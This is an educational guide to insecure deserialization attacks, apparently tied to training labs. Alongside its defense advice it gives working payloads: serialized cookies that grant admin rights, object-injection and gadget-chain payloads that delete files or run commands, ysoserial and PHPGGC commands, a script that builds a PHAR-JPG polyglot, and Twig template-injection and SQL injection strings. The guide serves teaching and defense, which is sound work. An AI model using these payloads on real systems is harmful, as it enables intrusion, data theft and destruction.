# Insecure Deserialization

## Table of Contents

1. [What is Serialization & Deserialization?](#1-what-is-serialization--deserialization)
2. [What is Insecure Deserialization?](#2-what-is-insecure-deserialization)
3. [Why It Exists — Root Causes](#3-why-it-exists--root-causes)
4. [Identifying Serialized Data on the Wire](#4-identifying-serialized-data-on-the-wire)
5. [Attack Techniques](#5-attack-techniques)
   - 5.1 [Modifying Serialized Object Attributes](#51-modifying-serialized-object-attributes)
   - 5.2 [Modifying Data Types (PHP Loose Comparison)](#52-modifying-data-types-php-loose-comparison)
   - 5.3 [Exploiting Application Functionality via Serialized Objects](#53-exploiting-application-functionality-via-serialized-objects)
   - 5.4 [Arbitrary Object Injection](#54-arbitrary-object-injection)
6. [Magic Methods — The Deserialization Hook](#6-magic-methods--the-deserialization-hook)
7. [Gadget Chains](#7-gadget-chains)
   - 7.1 [What a Gadget Chain Is](#71-what-a-gadget-chain-is)
   - 7.2 [Pre-Built Gadget Chains](#72-pre-built-gadget-chains)
   - 7.3 [Documented Gadget Chains](#73-documented-gadget-chains)
   - 7.4 [Building a Custom Gadget Chain](#74-building-a-custom-gadget-chain)
8. [PHAR Deserialization (PHP)](#8-phar-deserialization-php)
9. [Memory Corruption via Deserialization](#9-memory-corruption-via-deserialization)
10. [Chaining Deserialization with Secondary Vulnerabilities](#10-chaining-deserialization-with-secondary-vulnerabilities)
11. [Impact Assessment](#11-impact-assessment)
12. [Defense & Prevention](#12-defense--prevention)
13. [Quick Reference Cheat Sheet](#13-quick-reference-cheat-sheet)

---

## 1. What is Serialization & Deserialization?

**Serialization** converts a complex in-memory object (with all its fields, attributes, and state) into a flat, sequential byte stream — a format that can be stored, transmitted, or passed between processes.

**Deserialization** is the reverse: restoring a byte stream back to a fully functional object in memory, exactly as it was when serialized — including all attribute values, including private ones.

### Simple Analogy

Serialization is like packing a piece of furniture into flat-pack form for shipping — the table is disassembled and every component is labeled with its type and size. Deserialization is the person on the other end following those labels to reassemble the table. Insecure deserialization is when the recipient assembles whatever instructions arrive in the box — even if the box was swapped by an attacker who replaced the instructions with ones that build a trapdoor instead of a table.

### Normal Flow

```
[Server-side Object in Memory]
    │  (serialize)
    ▼
[Flat byte stream / string]
    │  (transmit: cookie, API, file, database)
    ▼
[Flat byte stream / string]
    │  (deserialize)
    ▼
[Object reconstructed in memory — used by application]
```

### Language Terminology

| Language | Serialize | Deserialize |
|----------|-----------|-------------|
| PHP | `serialize()` | `unserialize()` |
| Java | `ObjectOutputStream.writeObject()` | `ObjectInputStream.readObject()` |
| Python | `pickle.dumps()` | `pickle.loads()` |
| Ruby | `Marshal.dump()` | `Marshal.load()` |

> **Note:** Python's "pickling" and Ruby's "marshalling" are the same concept as serialization. Treat them identically when hunting for vulnerabilities.

---

## 2. What is Insecure Deserialization?

Insecure deserialization occurs when **user-controllable data is passed to a deserialization function** without sufficient validation. The application trusts the incoming byte stream to contain a safe, expected object — and the attacker supplies something else.

### The Core Danger — Object Injection

Deserialization functions do not verify that the byte stream represents the expected class. They will instantiate and reconstruct **any class available to the application** — not just the expected one.

```
Application expects:   User object  { username: "carlos", isAdmin: false }
Attacker supplies:     Any class available to the application with any attribute values
```

An object of a completely unexpected class will be instantiated. Even if this causes an exception later, **the damage may already be done** — many deserialization exploits fire during the instantiation process itself, before the application touches the object.

### Why This Matters

- The attack surface is not just the application's own code — it includes every class in every library the application imports
- Attacks can trigger automatically during deserialization, not just during subsequent use of the object
- Strongly typed languages are still vulnerable — the type check happens after instantiation

---

## 3. Why It Exists — Root Causes

| Root Cause | Explanation |
|------------|-------------|
| Misplaced trust | Developers treat serialized data as internal — "users can't read binary formats" — when in fact binary formats are just as manipulable |
| Late validation | Checks are applied after deserialization — too late to prevent the attack, which fires during instantiation |
| Dependency sprawl | Modern applications import dozens of libraries, each with their own classes. Any of those classes can be weaponized as gadgets |
| Impossible to sanitize | Validation logic cannot anticipate every possible gadget chain across all dependencies. The only safe answer is not deserializing untrusted data at all |

---

## 4. Identifying Serialized Data on the Wire

### Where to Look

Serialized objects are passed as user-controlled data anywhere the server needs to persist or transmit state:

- Session cookies
- Hidden form fields
- API request bodies
- `Referer` / custom HTTP headers
- Database-stored values read back later (second-order)
- Filenames passed to file processing functions

### PHP Serialization Format

PHP serialized objects are human-readable strings. Learning the format allows direct manual manipulation without needing extra scripts.

**Format breakdown:**

```
O:4:"User":2:{s:4:"name";s:6:"carlos";s:10:"isLoggedIn";b:1;}

O:4:"User"         → Object, class name is 4 chars: "User"
:2:                → 2 attributes follow
{                  → open attribute block
s:4:"name"         → key: string, 4 chars, "name"
s:6:"carlos"       → value: string, 6 chars, "carlos"
s:10:"isLoggedIn"  → key: string, 10 chars, "isLoggedIn"
b:1                → value: boolean true
}                  → close attribute block
```

**PHP type prefixes:**

| Prefix | Type | Example |
|--------|------|---------|
| `s:N:"value"` | String (N = length) | `s:5:"admin"` |
| `i:N` | Integer | `i:42` |
| `b:N` | Boolean (0=false, 1=true) | `b:1` |
| `d:N` | Float | `d:3.14` |
| `N` | Null | `N;` |
| `a:N:{...}` | Array (N = count) | `a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}` |
| `O:N:"Class":M:{...}` | Object (N=class name length, M=attr count) | See above |

**Source code indicator:** Look for `unserialize()` in PHP source code — this is where deserialization happens.

### Java Serialization Format

Java uses a binary format. Visual recognition:

| Location | Marker | Value |
|----------|--------|-------|
| Raw hex | Magic bytes | `AC ED` |
| Base64-encoded | First characters | `rO0` |

**Source code indicator:** Any class implementing `java.io.Serializable` can be serialized. Look for `readObject()` calls in the codebase — these are deserialization points.

### Ruby Serialization Format

Ruby's Marshal format is binary. Base64-encoded Marshal data typically begins with `BAh`. Look in session cookies and API responses.

**Source code indicator:** `Marshal.load()` — this is the deserialization sink.

### Quick Recognition

```
PHP:      O:4:"User":2:{...}          human-readable string
Java:     AC ED (hex) / rO0 (base64)  binary
Ruby:     BAh... (base64)             binary
Python:   \x80\x04... (pickle)        binary
```

> **Attacker note:** Always check cookies first. Session cookies containing serialized objects are the most common injection point — they are user-controlled, transmitted with every request, and often consumed by privileged application code. If a cookie is Base64-encoded, decode it first. If the result looks binary or contains the PHP `O:` prefix, it is a deserialization vector.

---

## 5. Attack Techniques

### 5.1 Modifying Serialized Object Attributes

**Situation:** The application deserializes a user-supplied cookie or parameter and uses attribute values to make authorization decisions, without re-checking against the database.

**Original serialized object (from cookie):**
```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

**Modified object (isAdmin flipped to true):**
```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;}
```

Re-encode (Base64 → URL-encode) and submit as the session cookie.

**What happens:**
```
Server deserializes cookie → creates User object with isAdmin = true
Application checks: if ($user->isAdmin) → true → grants admin access
```

**Why it works:** The application trusts the deserialized object state without verifying it against a server-side source of truth (the database). The integrity of the serialized data is never checked.

> **Attacker note:** Any boolean, integer, or role-related attribute is worth flipping. Also look for attributes like `accessLevel`, `role`, `userType`, `permissions`. The access check pattern `if (deserializedObject->privilege)` is the most common vulnerable pattern.

---

### 5.2 Modifying Data Types (PHP Loose Comparison)

**Situation:** The application uses PHP's loose comparison operator (`==`) to compare a deserialized attribute value against a stored value. PHP performs implicit type coercion in loose comparisons.

**PHP loose comparison behavior:**

| Comparison | Result | PHP version |
|-----------|--------|-------------|
| `0 == "Example string"` | `true` | PHP 7.x and below only |
| `5 == "5 of something"` | `true` | All versions |
| `5 == "5"` | `true` | All versions |
| `0 == "Example string"` | `false` | PHP 8+ |

**Vulnerable code pattern:**
```php
$login = unserialize($_COOKIE);
if ($login['password'] == $password) {
    // authenticated
}
```

**Attack:** Change the `password` attribute from a string to the integer `0`:

```
Original:  s:8:"password";s:12:"correcthorse"
Modified:  s:8:"password";i:0
```

**What happens:**
```
Deserialized password = integer 0
Stored password = string "correcthorse" (does not start with a digit)
PHP evaluates: 0 == "correcthorse" → converts "correcthorse" to 0 → 0 == 0 → true
Authentication bypass
```

**Why it works:** `unserialize()` preserves the data type from the stream — the integer `0` arrives as an integer, not the string `"0"`. If the value had come from a form field, it would be a string and the bypass would not work. Deserialization is what makes this possible.

> **Critical:** When changing data types in a PHP serialized object, the type prefix must be updated (`s:` → `i:`) and the length indicator must be removed (integers have no length field). Forgetting this corrupts the object and the server may silently discard it rather than erroring.

---

### 5.3 Exploiting Application Functionality via Serialized Objects

**Situation:** The application uses attribute values from deserialized objects as inputs to dangerous functions — file operations, database queries, system calls. The attacker can set attribute values to arbitrary paths or values.

**Example — file deletion via profile picture path:**

The application stores a user object with an `avatar_link` attribute. On account deletion, it calls `unlink($user->avatar_link)` to delete the profile picture.

**Original object:**
```
s:11:"avatar_link";s:19:"/uploads/carlos.jpg"
```

**Modified object:**
```
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
```

When the account deletion endpoint is triggered, the application reads the `avatar_link` from the deserialized cookie and calls `unlink("/home/carlos/morale.txt")` — deleting an arbitrary file.

**Why it works:** The application was written assuming the avatar path only ever points to images in the upload directory. The deserialization step gives the attacker full control over what value `avatar_link` holds — the downstream function call is never designed to handle attacker input.

> **Attacker note:** Look for attributes whose names suggest file paths (`path`, `file`, `image`, `avatar`, `template`, `log`, `backup`). Any functionality that reads from or writes to filesystem paths using deserialized attribute values is a target. Account deletion and profile update endpoints are particularly useful because they intentionally perform filesystem operations.

---

### 5.4 Arbitrary Object Injection

**Situation:** Source code or backup files are accessible (e.g. `.php~` backup extension). The attacker can read class definitions and find classes with magic methods that perform dangerous operations.

**Discovery technique:** If the application references `/libs/CustomTemplate.php`, request `/libs/CustomTemplate.php~` — web servers sometimes expose backup files with a tilde extension that should not be publicly accessible.

**Example — PHP `__destruct()` with `unlink()`:**

Discovered class definition:
```php
class CustomTemplate {
    public $lock_file_path;

    function __destruct() {
        // Invoked automatically when the object is garbage collected
        unlink($this->lock_file_path);
    }
}
```

**Crafted payload — inject a CustomTemplate object:**
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Base64 + URL-encode and submit as the session cookie.

**What happens:**
```
Server deserializes cookie
→ instantiates CustomTemplate with lock_file_path = "/home/carlos/morale.txt"
→ at end of request, PHP garbage collects the object
→ __destruct() fires automatically
→ unlink("/home/carlos/morale.txt") executes
→ arbitrary file deleted
```

**Why it works:** `unserialize()` will instantiate any class in the application's namespace. The application expected a `User` object but gets a `CustomTemplate` — and PHP doesn't care. The `__destruct()` magic method fires automatically regardless of what the application does with the object.

> **Attacker note:** The PHP backup file trick (`.php~`, `.php.bak`, `.php.swp`) works because developers push source files to production and web servers serve files by extension. `.php~` has no handler — it gets served as plain text rather than executed. Always probe known PHP file paths with these extensions.

---

## 6. Magic Methods — The Deserialization Hook

Magic methods are automatically invoked by the runtime when specific lifecycle events occur on an object. They do not need to be explicitly called — they fire by themselves.

### Why Magic Methods Are Critical for Deserialization Attacks

Some magic methods fire **during the deserialization process itself** — before the application code has any opportunity to validate or use the object. This means:

- The attack executes the moment the byte stream is deserialized
- The application never needs to "use" the object in a dangerous way
- The attacker only needs to get the serialized data into the deserialization function

### PHP Magic Methods Reference

| Method | When It Fires |
|--------|--------------|
| `__construct()` | When a new object is created (does NOT fire during `unserialize()`) |
| `__destruct()` | When the object is garbage collected — fires at end of request |
| `__wakeup()` | **Immediately when `unserialize()` is called** — first magic method to fire |
| `__sleep()` | When `serialize()` is called |
| `__toString()` | When the object is used as a string |
| `__get($name)` | When an undefined property is read |
| `__set($name, $value)` | When an undefined property is written |
| `__call($name, $args)` | When an undefined method is called |
| `__invoke()` | When the object is called as a function |

> **Attacker note:** `__wakeup()` and `__destruct()` are the highest-value methods for deserialization attacks. `__wakeup()` fires first and synchronously — perfect for triggering code immediately. `__destruct()` fires at the end of every request — reliable and automatic. `__toString()` and `__get()` are useful mid-chain when you need to pass an object into a string or property context.

### Java Magic Methods Reference

| Method | When It Fires |
|--------|--------------|
| `readObject()` | During `ObjectInputStream.readObject()` — fires during deserialization |
| `readResolve()` | After `readObject()` — can substitute a different object |
| `finalize()` | When the object is garbage collected |

**Custom `readObject()` pattern:**
```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    in.defaultReadObject();
    // Any code here executes during deserialization
}
```

If a class declares its own `readObject()`, that code runs automatically when the class is deserialized — even before the application uses the object.

---

## 7. Gadget Chains

### 7.1 What a Gadget Chain Is

A **gadget** is a snippet of existing application or library code that can be used to perform a specific operation when invoked with attacker-controlled data. Individual gadgets are benign in isolation — the danger emerges when they are **chained together**.

```
[Magic Method — Kick-off Gadget]
    │  invokes a method on an attacker-controlled attribute
    ▼
[Intermediate Gadget]
    │  passes data to another method
    ▼
[Intermediate Gadget]
    │  passes data to another method
    ▼
[Sink Gadget]
    └─► exec(), unlink(), file_put_contents(), SQL query, etc.
```

**Key insight:** The attacker does not inject code. All the code in a gadget chain already exists on the server. The attacker only controls the **data** that flows through the chain — the path the data takes is determined by which classes and methods are chained together.

**Prerequisite for gadget chain attacks:**
1. The application deserializes user-controlled data
2. At least one class has a magic method that fires during deserialization
3. That magic method, directly or through further method calls, eventually passes attacker-controlled data into a dangerous sink

### 7.2 Pre-Built Gadget Chains

Many popular frameworks and libraries contain known exploitable gadget chains, discovered and documented by security researchers. Because these libraries are widely used, any application importing them may be vulnerable to the same chain.

**ysoserial (Java):**

A collection of pre-built Java deserialization gadget chains. Each chain targets a specific library (e.g. `CommonsCollections`, `Spring`, `Hibernate`). Usage:

```bash
# Generate a serialized payload executing a command via CommonsCollections4
java -jar ysoserial-all.jar CommonsCollections4 'id' | base64

# For Java 16+ (module system requires explicit opens)
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'id' | base64
```

**ysoserial detection-only chains (no RCE required):**

| Chain | What It Does | Use Case |
|-------|-------------|----------|
| `URLDNS` | Triggers a DNS lookup to a supplied URL | Detect deserialization without RCE; works on all Java versions; no library dependency |
| `JRMPClient` | Triggers a TCP connection to a supplied IP | Detect in environments where DNS egress is blocked; supply internal IP vs. firewalled IP and compare response times |

**PHPGGC (PHP):**

Equivalent tool for PHP frameworks. Contains chains for Symfony, Laravel, Guzzle, Monolog, and others.

```bash
# Generate RCE payload for Symfony RCE4 chain
./phpggc Symfony/RCE4 exec 'id' | base64
```

**Using a pre-built chain when a signature check exists:**

If the application signs its serialized cookies (e.g. HMAC), the signature must be regenerated after replacing the token with the malicious payload. This requires obtaining the secret key first — look for:
- Debug endpoints leaking environment variables (e.g. `phpinfo.php`)
- Developer comments in source code revealing config file locations
- Error messages reflecting internal configuration

Once the key is found:
```php
<?php
$object = "PHPGGC-GENERATED-PAYLOAD";
$secretKey = "LEAKED-KEY";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

> **Attacker note:** When a pre-built chain fails, the first question is whether the target actually uses the library the chain targets. Identify the framework from HTTP response headers (`X-Powered-By`), error messages, or URL structures. Then try all chains for that framework before moving on to custom chain development.

### 7.3 Documented Gadget Chains

Between pre-built tools and fully custom research, a middle ground exists: manually adapting publicly documented exploits.

Search for `[Framework/Language] deserialization gadget chain` + the specific version number. Security blog posts, GitHub repositories, and conference talks frequently document full chains with working proof-of-concept code. Adapt the command being executed; the chain structure itself can often be used verbatim.

**Ruby example — universal deserialization gadget for Ruby 2.x–3.x:**

Publicly documented chains exist for Ruby's Marshal format. The typical adaptation needed is only:
1. Change the command from the example (`id`) to the desired payload
2. Ensure the output is Base64-encoded for cookie injection

### 7.4 Building a Custom Gadget Chain

Required when no pre-built or documented chain exists for the target. Almost always requires source code access.

**Step-by-step process:**

```
Step 1: Find a kick-off gadget
        → Search for classes with magic methods that fire during deserialization
        → PHP: __wakeup(), __destruct()
        → Java: readObject()
        → Does the magic method directly execute dangerous code on attacker-controlled data?
          YES → Exploit directly
          NO  → Use it as the chain entry point

Step 2: Trace data flow from the kick-off gadget
        → What methods does the magic method call?
        → Which of those methods can receive attacker-controlled values?
        → Do any of them call further methods? Follow every branch.

Step 3: Find a sink gadget
        → A sink is a method that does something dangerous: exec(), unlink(),
          file_put_contents(), eval(), a SQL query, etc.
        → The sink must be reachable from the kick-off gadget via a chain
          where every step accepts attacker-controlled data

Step 4: Construct the payload
        → Work backwards from the sink to the kick-off gadget
        → Set each object's attributes to point to the next gadget in the chain
        → Serialize the fully constructed object graph

Step 5: Test for secondary vulnerabilities
        → Each gadget in the chain is another potential injection point
        → If data passes through a SQL query gadget, inject SQLi
        → If data is used in a template, inject SSTI
```

**PHP custom chain example (conceptual):**

Discovered classes:
```php
class CustomTemplate {
    public $default_desc_type;
    public $desc;
    // __wakeup() creates: new Product($this->default_desc_type, $this->desc)
}

class DefaultMap {
    public $callback;
    // __get($name): calls call_user_func($this->callback, $name)
    //               executes callback with the non-existent property name as argument
}
```

**Data flow analysis:**
```
__wakeup() fires on CustomTemplate
→ Product constructor called with $default_desc_type and $desc
→ Product reads $default_desc_type from $desc (which is a DefaultMap object)
→ DefaultMap.__get("rm /home/carlos/morale.txt") fires
→ call_user_func("exec", "rm /home/carlos/morale.txt")
→ OS command executes
```

**Serialized payload:**
```
O:14:"CustomTemplate":2:{
  s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";
  s:4:"desc";O:10:"DefaultMap":1:{
    s:8:"callback";s:4:"exec";
  }
}
```

---

## 8. PHAR Deserialization (PHP)

### What PHAR Is

PHP Archive (`.phar`) is a file format for packaging PHP applications — similar to Java's JAR. PHP exposes a `phar://` stream wrapper for reading PHAR files through filesystem functions.

**Critical property:** PHAR manifest files contain serialized PHP metadata. When PHP processes a `phar://` stream via any filesystem function, **that metadata is automatically deserialized** — even if the application never explicitly calls `unserialize()`.

### Why This Matters

This creates a deserialization vector that bypasses the obvious code-review indicator (`unserialize()` calls). Instead, the attack path is:

```
Upload a PHAR file disguised as a permitted type (e.g. JPEG)
          │
          ▼
Trigger a filesystem operation on the uploaded file using phar:// scheme
          │
          ▼
PHP processes the phar:// stream → PHAR metadata deserialized automatically
          │
          ▼
Magic methods (__wakeup(), __destruct()) fire → gadget chain executes
```

### Filesystem Functions That Trigger PHAR Deserialization

Any PHP filesystem function triggers deserialization when given a `phar://` path:

```php
file_exists()      file_get_contents()    copy()
is_file()          file_put_contents()    rename()
include()          fopen()                unlink()
require()          stat()                 mime_content_type()
```

`file_exists()` is particularly useful because it is commonly used to check avatar/image paths — less likely to have strict protections compared to `include()` or `fopen()`.

### Attack Flow

**1. Create a PHAR-JPG polyglot:**

The PHAR file must pass the application's image validation (magic bytes, file structure). A PHAR-JPG polyglot is simultaneously a valid JPEG and a PHAR archive — it passes image validation but is parsed as a PHAR when accessed via `phar://`.

PHAR payload construction (PHP):
```php
class CustomTemplate {}
class Blog {}

$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}';
$blog->user = 'user';
$object->template_file_path = $blog;

// Create PHAR
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");  // JPEG magic bytes + PHAR stub
$phar->setMetadata($object);     // gadget chain object stored as serialized metadata
$phar->stopBuffering();
rename('exploit.phar', 'exploit.jpg');
```

**2. Upload the polyglot as a profile picture** — passes image validation because JPEG magic bytes are present.

**3. Trigger deserialization:**

Change the file access request to use the `phar://` wrapper:
```
GET /cgi-bin/avatar.php?avatar=phar://wiener
```

The avatar loading code calls `file_exists("phar://wiener.jpg")` — PHP parses the PHAR, deserializes the metadata, the gadget chain fires.

> **Attacker note:** Any user-controlled path that feeds into a filesystem function is a PHAR trigger candidate — avatar loading, file preview, document processing, backup restoration. The `phar://` scheme works regardless of file extension. A file named `exploit.jpg` is processed as a PHAR when accessed via `phar://exploit.jpg`.

---

## 9. Memory Corruption via Deserialization

Even without a discovered gadget chain, deserialization functions themselves expose attack surface for memory corruption vulnerabilities.

PHP's `unserialize()` and equivalent functions in other languages are complex parsers that have historically contained memory corruption bugs — buffer overflows, use-after-free conditions, integer overflows in length handling.

Publicly documented memory corruption CVEs against deserialization functions can achieve remote code execution without any application-level gadget chain. The vulnerability is in the deserialization runtime itself.

**Key implication:** An application that believes it has eliminated all gadget chains may still be exploitable via a memory corruption vulnerability in the deserialization library. This is why the only truly safe mitigation is to never deserialize untrusted data.

---

## 10. Chaining Deserialization with Secondary Vulnerabilities

Custom gadget chains often pass attacker-controlled data through multiple intermediate steps. Each step is a potential injection point for a secondary vulnerability.

### SQLi via Deserialization (Java)

**Scenario:** A `readObject()` implementation passes an object attribute into a SQL query:

```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    in.defaultReadObject();
    // id is passed directly into a SQL query during deserialization
    Connection conn = getDbConnection();
    PreparedStatement stmt = conn.prepareStatement(
        "SELECT * FROM products WHERE id = '" + this.id + "'"  // vulnerable concatenation
    );
}
```

The `id` field is attacker-controlled (set in the serialized object). Injecting a SQL payload into `id` causes SQL injection to fire during deserialization — before the application code processes the object.

**Error-based extraction via UNION:**
```sql
' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
```

The type mismatch (`CAST password AS numeric`) causes an error that includes the password value in the error message — returned in the HTTP response.

### SSTI via Deserialization (PHP + Twig)

**Scenario:** A gadget chain eventually passes data into a template engine call. If the application uses Twig and an attacker-controlled string is passed as template content:

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

This Twig SSTI payload registers `exec` as a filter callback and invokes it with the command — achieving RCE through the template engine rather than directly.

The combined chain: `__wakeup()` → object attribute → Twig render call → SSTI → `exec()`.

---

## 11. Impact Assessment

| Condition | Impact |
|-----------|--------|
| Attribute modification only | Privilege escalation, authentication bypass |
| Application functionality abuse | Arbitrary file deletion, path traversal |
| Arbitrary object injection + magic methods | Arbitrary code execution during deserialization |
| Pre-built gadget chain available | RCE with low effort |
| Custom gadget chain required | RCE with source code access |
| PHAR deserialization | RCE without `unserialize()` call in code |
| Memory corruption | RCE regardless of gadget chain availability |
| Secondary SQLi via gadget | Database exfiltration on top of RCE |
| Secondary SSTI via gadget | RCE through alternative path |

### Severity Factors

| Factor | Lower | Higher |
|--------|-------|--------|
| Source code access | No | Yes — enables custom chains |
| Libraries used | Niche/custom | CommonCollections, Spring, Symfony, Laravel |
| Magic methods present | None | `__wakeup()`, `readObject()`, `__destruct()` |
| Sink gadgets reachable | None | `exec()`, `unlink()`, SQL query |
| Filesystem functions used | None | `file_exists()`, `fopen()` on user paths |
| Post-deserialization checks | Signature verified before deserialization | Signature checked after or not at all |

---

## 12. Defense & Prevention

### Core Principle

**Do not deserialize untrusted user input.** This is the only complete fix. All other mitigations reduce severity or increase attack difficulty — they do not eliminate the vulnerability class.

### 1. Avoid Deserializing User-Controlled Data Entirely

Redesign features that currently rely on serialized objects. Use structured data formats (JSON, XML) with explicit schema validation for data that must be transmitted to clients. JSON does not carry executable class information — it cannot trigger magic methods or gadget chains.

```python
# Instead of serializing a User object into a cookie:
# VULNERABLE
cookie = base64(serialize(user_object))

# SAFE — store only an opaque identifier; look up state server-side
session_id = generate_secure_random_token()
server_side_session_store[session_id] = user_data
cookie = session_id
```

### 2. Sign and Verify Serialized Data Before Deserialization

If serialization cannot be avoided, attach a cryptographic signature (HMAC) to detect tampering. Verify the signature **before** calling the deserialization function — not after.

```python
import hmac, hashlib, base64

SECRET_KEY = b"long-random-secret"

def serialize_signed(obj):
    data = base64.b64encode(serialize(obj))
    sig = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
    return data + b"." + sig.encode()

def deserialize_verified(token):
    data, sig = token.rsplit(b".", 1)
    expected = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig.decode(), expected):
        raise ValueError("Signature verification failed")
    return deserialize(base64.b64decode(data))
```

> **Critical:** If the secret key leaks (via debug endpoints, error messages, configuration exposure), the signature provides no protection. Signing is a second-layer control, not a primary one.

### 3. Use Class Allowlists for Deserialization

Restrict deserialization to only the expected class. If the incoming data represents anything else, reject it before instantiation.

**Java — using `ObjectInputFilter` (Java 9+):**
```java
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filterInfo -> {
    Class<?> clazz = filterInfo.serialClass();
    if (clazz != null && !ALLOWED_CLASSES.contains(clazz.getName())) {
        return ObjectInputFilter.Status.REJECTED;
    }
    return ObjectInputFilter.Status.ALLOWED;
});
```

**PHP — check class before using the object (limited protection):**
```php
$obj = unserialize($data);  // object already instantiated — magic methods already fired
if (!($obj instanceof ExpectedClass)) {
    throw new Exception("Unexpected class");
}
```

> **Limitation:** In PHP, the check comes after `unserialize()` — magic methods have already executed. Class filtering after the fact does not prevent `__wakeup()` and `__destruct()` from firing. Java's `ObjectInputFilter` is more effective because it rejects classes before instantiation.

### 4. Keep Dependencies Up to Date

Gadget chains rely on specific versions of libraries containing exploitable code. Updating dependencies removes known gadget chain targets. Monitor security advisories for serialization-related CVEs in all libraries the application imports.

### 5. Disable PHAR Deserialization (PHP)

If PHAR functionality is not needed, disable the `phar://` stream wrapper to eliminate this attack path:

```ini
; php.ini
phar.readonly = On          ; prevents creating new PHAR archives
```

For applications that do not use PHAR at all, consider disabling the phar extension entirely or using a wrapper-blocking approach at the filesystem operation level.

### 6. Never Expose Backup or Source Files

`.php~`, `.php.bak`, `.php.swp`, `.bak` files reveal class definitions that enable custom gadget chain construction. Configure the web server to deny access to these patterns:

```apache
# Apache — block backup file extensions
<FilesMatch "\.(php~|php\.bak|bak|swp|old|orig)$">
    Require all denied
</FilesMatch>
```

---

## 13. Quick Reference Cheat Sheet

### Signs a Deserialization Vulnerability May Be Present

- Session cookie contains `O:` prefix (PHP) or `rO0` / `AC ED` (Java base64/hex)
- Cookie value is Base64-encoded — decode it and check for serialized format markers
- Cookie or parameter changes cause unexpected server errors or changed behavior
- Application source or backup files accessible via `.php~` or `.bak` extension
- Error messages reference class names, `unserialize()`, `readObject()`, or `Marshal`
- Response includes class-specific error messages (Java stack traces naming serializable classes)

### PHP Serialized Object — Manual Edit Checklist

```
1. Decode the cookie: URL-decode → Base64-decode
2. Identify the attribute to modify
3. Change the value
4. Update the type prefix if changing type (s: → i: → b:)
5. Update the length indicator for string values (s:6:"carlos" → s:5:"admin" if length changes)
6. Re-encode: Base64-encode → URL-encode
7. Submit as the cookie
```

### PHP Format Reference

```php
// Boolean
b:0;          // false
b:1;          // true

// Integer
i:42;

// String (length must match)
s:5:"admin";

// Object
O:4:"User":2:{s:4:"name";s:6:"carlos";s:7:"isAdmin";b:0;}
//  ↑ class name length
//        ↑ class name
//               ↑ attribute count

// Null
N;
```

### Java Detection Markers

| Encoding | Marker |
|----------|--------|
| Raw binary | First two bytes: `AC ED` |
| Base64 | Starts with: `rO0` |
| Hex | Starts with: `aced0005` |

### Magic Method Execution Timing

| Language | Method | When |
|----------|--------|------|
| PHP | `__wakeup()` | Immediately on `unserialize()` |
| PHP | `__destruct()` | End of request / garbage collection |
| PHP | `__toString()` | When object used as string |
| PHP | `__get($n)` | When undefined property read |
| Java | `readObject()` | During `ObjectInputStream.readObject()` |
| Java | `finalize()` | Garbage collection |
| Ruby | `marshal_load()` | During `Marshal.load()` |

### Pre-Built Chain Tooling

| Target | Chain Tool | Detection Chain | RCE Chain Example |
|--------|-----------|-----------------|-------------------|
| Java (generic) | ysoserial | `URLDNS` (DNS), `JRMPClient` (TCP) | `CommonsCollections4` |
| PHP Symfony | PHPGGC | — | `Symfony/RCE4` |
| PHP Laravel | PHPGGC | — | `Laravel/RCE1` |
| PHP Guzzle | PHPGGC | — | `Guzzle/FW1` |

### Custom Gadget Chain Hunt — What to Look For

```
Source code:
  1. grep -r "unserialize"           → PHP deserialization sinks
  2. grep -r "readObject"            → Java deserialization sinks
  3. grep -r "__wakeup\|__destruct"  → kick-off magic methods (PHP)
  4. grep -r "implements Serializable" → serializable Java classes
  5. grep -r "exec\|system\|eval\|unlink\|file_put_contents"  → sink gadgets

Backup/source exposure:
  Add ~ or .bak to any .php filename in the site map
  Check /libs/, /includes/, /classes/ directories

Sink gadgets to find in the chain:
  exec(), system(), passthru(), shell_exec()   → OS command execution
  unlink(), rename(), copy()                   → filesystem write/delete
  file_put_contents()                          → write arbitrary files
  eval()                                       → code execution
  SQL query construction with string concat    → SQLi
  template render with user data              → SSTI
```

### PHAR Attack Prerequisites

```
1. Application deserializes user-controllable data (via phar:// trigger, not necessarily explicit unserialize())
2. Application performs a filesystem operation on a user-controlled path
3. Attacker can upload files to the server (any upload vector)
4. Application uses a gadget-chain-containing class

Attack:
  Create PHAR with gadget chain in metadata → disguise as permitted file type
  → Upload → trigger filesystem function with phar:// path
```